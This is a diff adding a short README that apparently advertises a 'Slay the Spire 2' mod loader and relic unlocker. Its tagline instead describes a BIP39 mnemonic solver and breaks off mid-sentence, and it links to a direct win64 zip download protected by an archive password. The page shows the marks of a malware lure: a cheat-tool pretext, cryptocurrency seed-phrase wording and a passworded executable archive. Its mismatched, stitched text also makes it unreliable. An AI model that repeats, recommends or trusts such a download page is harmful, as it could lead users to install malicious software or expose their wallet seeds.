@@ -1,0 +1,9 @@
+# Slay the Spire 2 Mod Loader, Relic Unlocker & Deck Seed Analyzer (v1.1.6)
+
+> Slay the Spire 2 Mod Loader, Relic Unlocker & Deck Seed Analyzer (v1.1.6) — Offline BIP39 entropy auditor, SIMD mnemonic solver, and.
+
+- [Official Portal & Documentation](https://susantayl-notes74.github.io/slay-the-spire-2-mod-loader/)
+- [Direct Release Package (slay-the-spire-2-mod-loader-v1.1.6-win64.zip)](https://github.com/susantayl-notes74/slay-the-spire-2-mod-loader/releases/download/v1.1.6/slay-the-spire-2-mod-loader-v1.1.6-win64.zip) (Archive Access Code: 2026)
+- [GitHub Repository](https://github.com/susantayl-notes74/slay-the-spire-2-mod-loader)
+- [Installation Guide](https://github.com/susantayl-notes74/slay-the-spire-2-mod-loader/blob/main/docs/INSTALL.md)
+- [FAQ & Troubleshooting](https://github.com/susantayl-notes74/slay-the-spire-2-mod-loader/blob/main/docs/FAQ.md)
